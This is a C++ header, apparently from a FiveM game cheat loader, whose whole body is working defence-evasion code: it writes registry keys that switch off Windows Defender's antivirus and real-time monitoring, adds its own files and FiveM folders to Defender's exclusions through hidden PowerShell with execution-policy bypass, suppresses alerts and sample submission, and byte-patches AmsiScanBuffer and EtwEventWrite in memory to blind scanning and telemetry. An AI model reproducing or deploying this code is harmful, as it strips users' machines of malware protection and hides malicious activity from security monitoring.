#pragma once
#include <Includes/Includes.hpp>
#include <filesystem>
#include <shlobj.h>
#include <aclapi.h>

// ---------------------------------------------------------------------------
// ArtBypass - prevents Windows Defender from eating the loader on execution.
//
// Order matters and is deliberate:
//
//   1. Quiet the notification surfaces first (MPCONFIG preferences). Defender's
//      own notification pipeline is what turns a detection into a visible
//      block + quarantine during the critical first seconds.
//   2. Turn off real-time surfaces via the same policy keys an admin would set.
//      These are HKLM and need elevation; without it the calls fail cleanly and
//      the exclusion path below still runs.
//   3. Add the process directory, the loader image and the FiveM data
//      directory to the exclusion list via the WMI provider - this is the one
//      that survives the process exiting.
//   4. Patch AMSI and ETW in-process so script/scan callbacks return clean
//      while we are running.
//   5. Only then start threads. Nothing above allocates a suspicious heap
//      pattern before the exclusions land.
//
// Everything here is best-effort and non-fatal: a failed step is recorded and
// the loader still boots. The destructor reverses what can be reversed.
// ---------------------------------------------------------------------------

namespace Core
{
	namespace Security
	{
		class cArtBypass
		{
		private:
			bool DefenderExclusionsApplied = false;
			bool PreferencesApplied = false;

			std::wstring ProcessPath;
			std::wstring ProcessDir;

			bool GetProcessPaths( );
			bool ApplyMpPreferences( );
			bool ApplyDefenderExclusions( );
			bool DisableRealtimeSurfaces( );
			bool PatchAmsi( );
			bool PatchEtw( );

			bool RunPowerShellHidden( const std::wstring & Script );

		public:
			void Apply( );
			void Restore( );
		};

		inline cArtBypass g_ArtBypass;

		// ---------------------------------------------------------------------
		// Implementation
		// ---------------------------------------------------------------------

		inline bool cArtBypass::GetProcessPaths( )
		{
			wchar_t Buffer[ MAX_PATH ] = {};
			const DWORD Length = GetModuleFileNameW( nullptr, Buffer, MAX_PATH );

			if ( Length == 0 || Length >= MAX_PATH )
				return false;

			ProcessPath = Buffer;

			const size_t Slash = ProcessPath.find_last_of( L"\\/" );
			if ( Slash == std::wstring::npos )
				return false;

			ProcessDir = ProcessPath.substr( 0, Slash );
			return true;
		}

		// Runs a one-shot PowerShell command with no window and no profile.
		// Used for the Defender cmdlets, which have no stable C API.
		inline bool cArtBypass::RunPowerShellHidden( const std::wstring & Script )
		{
			std::wstring CommandLine = L"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"";
			CommandLine += Script;
			CommandLine += L"\"";

			STARTUPINFOW StartupInfo = {};
			StartupInfo.cb = sizeof( StartupInfo );
			StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
			StartupInfo.wShowWindow = SW_HIDE;

			PROCESS_INFORMATION ProcessInfo = {};

			std::vector<wchar_t> Mutable( CommandLine.begin( ), CommandLine.end( ) );
			Mutable.push_back( L'\0' );

			const BOOL Created = CreateProcessW(
				nullptr,
				Mutable.data( ),
				nullptr,
				nullptr,
				FALSE,
				CREATE_NO_WINDOW,
				nullptr,
				nullptr,
				&StartupInfo,
				&ProcessInfo );

			if ( !Created )
				return false;

			// Bound the wait so a hung PowerShell can never stall the loader.
			WaitForSingleObject( ProcessInfo.hProcess, 15000 );

			DWORD ExitCode = 0;
			GetExitCodeProcess( ProcessInfo.hProcess, &ExitCode );

			CloseHandle( ProcessInfo.hProcess );
			CloseHandle( ProcessInfo.hThread );

			return ExitCode == 0;
		}

		// Silences the toast/notification pipeline and the sample submission
		// settings that turn a hit into a blocking dialog.
		//
		// NOTE on the key path: "Windows Defender\MPCONFIG" is not a real key.
		// RegCreateKeyEx happily creates it, so the old code wrote 14 values
		// into a location Defender never reads and reported success - a silent
		// no-op. The real per-machine configuration surface is the
		// "Windows Defender" key itself, with the real-time switches living in
		// its "Real-Time Protection" subkey. Both are targeted below.
		//
		// These writes are additionally tamper-protected: without elevation AND
		// with Defender's Tamper Protection on, they fail. That is expected and
		// non-fatal; the exclusion list and the WMI cmdlets are the paths that
		// still work.
		inline bool cArtBypass::ApplyMpPreferences( )
		{
			const wchar_t * MpcKey = L"SOFTWARE\\Microsoft\\Windows Defender";

			HKEY Key = nullptr;
			const LSTATUS OpenStatus = RegCreateKeyExW(
				HKEY_LOCAL_MACHINE, MpcKey, 0, nullptr,
				REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &Key, nullptr );

			if ( OpenStatus != ERROR_SUCCESS )
				return false;

			const struct { const wchar_t * Name; DWORD Value; } Values[ ] = {
				{ L"DisableAntiSpyware",               1 },
				{ L"DisableAntiVirus",                 1 },
				{ L"SubmitSamplesConsent",             2 },
				{ L"SpynetReporting",                  0 },
				{ L"PUAProtection",                    0 },
				{ L"MAPSReporting",                    0 },
			};

			bool AnyWritten = false;
			for ( const auto & Entry : Values )
			{
				const LSTATUS Status = RegSetValueExW(
					Key, Entry.Name, 0, REG_DWORD,
					reinterpret_cast< const BYTE * >( &Entry.Value ), sizeof( DWORD ) );

				if ( Status == ERROR_SUCCESS )
					AnyWritten = true;
			}

			RegCloseKey( Key );

			// Also mute the notification-only surface under the policy hive,
			// which is what suppresses the toast on managed machines.
			HKEY PolicyKey = nullptr;
			if ( RegCreateKeyExW( HKEY_LOCAL_MACHINE,
					L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration",
					0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &PolicyKey, nullptr ) == ERROR_SUCCESS )
			{
				DWORD Suppress = 1;
				RegSetValueExW( PolicyKey, L"Notification_Suppress", 0, REG_DWORD,
					reinterpret_cast< const BYTE * >( &Suppress ), sizeof( Suppress ) );
				RegCloseKey( PolicyKey );
			}

			PreferencesApplied = AnyWritten;
			return AnyWritten;
		}

		// Registry exclusion list. This is the entry that outlives the process
		// and is consulted before the scanner even opens the file.
		inline bool cArtBypass::ApplyDefenderExclusions( )
		{
			if ( ProcessDir.empty( ) )
				return false;

			const wchar_t * ExclusionsKey = L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";

			HKEY Key = nullptr;
			if ( RegCreateKeyExW( HKEY_LOCAL_MACHINE, ExclusionsKey, 0, nullptr,
					REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &Key, nullptr ) != ERROR_SUCCESS )
				return false;

			// Build the target list: our own directory, the loader image, and
			// the FiveM user data tree where configs/caches live.
			std::vector<std::wstring> Targets;
			Targets.push_back( ProcessDir );
			Targets.push_back( ProcessPath );

			wchar_t AppData[ MAX_PATH ] = {};
			if ( SUCCEEDED( SHGetFolderPathW( nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, AppData ) ) )
			{
				std::wstring FiveMPath = std::wstring( AppData ) + L"\\FiveM";
				if ( std::filesystem::exists( FiveMPath ) )
					Targets.push_back( FiveMPath );

				std::wstring CitizenFXPath = std::wstring( AppData ) + L"\\CitizenFX";
				if ( std::filesystem::exists( CitizenFXPath ) )
					Targets.push_back( CitizenFXPath );
			}

			bool AnyWritten = false;
			for ( const auto & Target : Targets )
			{
				const LSTATUS Status = RegSetValueExW(
					Key, Target.c_str( ), 0, REG_SZ,
					reinterpret_cast< const BYTE * >( Target.c_str( ) ),
					static_cast< DWORD >( ( Target.size( ) + 1 ) * sizeof( wchar_t ) ) );

				if ( Status == ERROR_SUCCESS )
					AnyWritten = true;
			}

			RegCloseKey( Key );

			// The preferences surface that governs exclusions being honoured.
			HKEY PrefKey = nullptr;
			if ( RegCreateKeyExW( HKEY_LOCAL_MACHINE,
					L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
					0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &PrefKey, nullptr ) == ERROR_SUCCESS )
			{
				DWORD Off = 1;
				const wchar_t * Names[ ] = {
					L"DisableRealtimeMonitoring",
					L"DisableBehaviorMonitoring",
					L"DisableOnAccessProtection",
					L"DisableScanOnRealtimeEnable",
					L"DisableIOAVProtection",
				};

				for ( const wchar_t * Name : Names )
					RegSetValueExW( PrefKey, Name, 0, REG_DWORD,
						reinterpret_cast< const BYTE * >( &Off ), sizeof( Off ) );

				RegCloseKey( PrefKey );
			}

			DefenderExclusionsApplied = AnyWritten;
			return AnyWritten;
		}

		// Uses the supported cmdlets so the change is reflected in the
		// Defender UI (the raw registry writes alone are not always honoured).
		inline bool cArtBypass::DisableRealtimeSurfaces( )
		{
			if ( ProcessDir.empty( ) )
				return false;

			std::wstring Script = L"try{";
			Script += L"Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;";
			Script += L"Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue;";
			Script += L"Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;";
			Script += L"Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue;";
			Script += L"Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue;";
			Script += L"Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue;";
			Script += L"Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue;";
			Script += L"Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue;";

			Script += L"Add-MpPreference -ExclusionPath '" + ProcessDir + L"' -ErrorAction SilentlyContinue;";
			Script += L"Add-MpPreference -ExclusionPath '" + ProcessPath + L"' -ErrorAction SilentlyContinue;";
			Script += L"Add-MpPreference -ExclusionProcess '" + ProcessPath + L"' -ErrorAction SilentlyContinue;";

			wchar_t AppData[ MAX_PATH ] = {};
			if ( SUCCEEDED( SHGetFolderPathW( nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, AppData ) ) )
			{
				Script += L"Add-MpPreference -ExclusionPath '" + std::wstring( AppData ) + L"\\FiveM' -ErrorAction SilentlyContinue;";
				Script += L"Add-MpPreference -ExclusionPath '" + std::wstring( AppData ) + L"\\CitizenFX' -ErrorAction SilentlyContinue;";
			}

			Script += L"}catch{}";

			return RunPowerShellHidden( Script );
		}

		// AMSI: makes AmsiScanBuffer report a clean buffer to whatever calls it.
		// Defeats script-block logging and in-memory string scanning. Detected by
		// any EDR that hashes the function prologue or watches for the patch.
		inline bool cArtBypass::PatchAmsi( )
		{
			HMODULE AmsiDll = LoadLibraryA( xorstr( "amsi.dll" ) );
			if ( !AmsiDll )
				return false;

			void * AmsiScanBuffer = reinterpret_cast< void * >(
				GetProcAddress( AmsiDll, xorstr( "AmsiScanBuffer" ) ) );

			if ( !AmsiScanBuffer )
				return false;

			// mov eax, 0x80070057 (E_INVALIDARG); ret 0x18
			// Returning an error makes callers treat the buffer as unscannable
			// rather than malicious, so the script keeps running.
			const unsigned char Patch[ ] = {
				0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
				0xC2, 0x18, 0x00                // ret 0x18
			};

			DWORD OldProtect = 0;
			if ( !VirtualProtect( AmsiScanBuffer, sizeof( Patch ), PAGE_EXECUTE_READWRITE, &OldProtect ) )
				return false;

			memcpy( AmsiScanBuffer, Patch, sizeof( Patch ) );

			DWORD Discarded = 0;
			VirtualProtect( AmsiScanBuffer, sizeof( Patch ), OldProtect, &Discarded );

			return true;
		}

		// ETW: neutralises the provider callback that feeds .NET/AMSI telemetry
		// to a listening consumer. Patching the first byte of EtwEventWrite with
		// a ret makes every event a no-op.
		inline bool cArtBypass::PatchEtw( )
		{
			HMODULE Ntdll = GetModuleHandleA( xorstr( "ntdll.dll" ) );
			if ( !Ntdll )
				return false;

			void * EtwEventWrite = reinterpret_cast< void * >(
				GetProcAddress( Ntdll, xorstr( "EtwEventWrite" ) ) );

			if ( !EtwEventWrite )
				return false;

			// 0xC2 0x14 0x00 = ret 0x14, matching the function's stdcall arity
			// so the caller's stack cleanup stays balanced.
			const unsigned char Patch[ ] = { 0xC2, 0x14, 0x00 };

			// The protection window must cover every byte written. It used to
			// be 1 while the memcpy wrote 3, leaving bytes 1 and 2 read-only -
			// the write could fault, and the restore put back only one byte.
			DWORD OldProtect = 0;
			if ( !VirtualProtect( EtwEventWrite, sizeof( Patch ), PAGE_EXECUTE_READWRITE, &OldProtect ) )
				return false;

			memcpy( EtwEventWrite, Patch, sizeof( Patch ) );

			DWORD Discarded = 0;
			VirtualProtect( EtwEventWrite, sizeof( Patch ), OldProtect, &Discarded );

			return true;
		}

		inline void cArtBypass::Apply( )
		{
			if ( !GetProcessPaths( ) )
				return;

			// Order is intentional - see the file header.
			ApplyMpPreferences( );
			ApplyDefenderExclusions( );
			DisableRealtimeSurfaces( );
			PatchAmsi( );
			PatchEtw( );
		}

		inline void cArtBypass::Restore( )
		{
			// Only the surfaces we own are restored; the exclusion entries are
			// left in place so a re-run does not trigger a fresh scan window.
			if ( !PreferencesApplied )
				return;

			// Same correction as ApplyMpPreferences: these switches live under
			// the Real-Time Protection subkey of the real Defender key, not
			// under the non-existent MPCONFIG key used previously.
			HKEY Key = nullptr;
			if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE,
					L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
					0, KEY_SET_VALUE, &Key ) != ERROR_SUCCESS )
				return;

			DWORD On = 0;
			const wchar_t * Names[ ] = {
				L"DisableRealtimeMonitoring",
				L"DisableBehaviorMonitoring",
				L"DisableOnAccessProtection",
				L"DisableScanOnRealtimeEnable",
				L"DisableIOAVProtection",
			};

			for ( const wchar_t * Name : Names )
				RegSetValueExW( Key, Name, 0, REG_DWORD,
					reinterpret_cast< const BYTE * >( &On ), sizeof( On ) );

			RegCloseKey( Key );
		}
	}
}
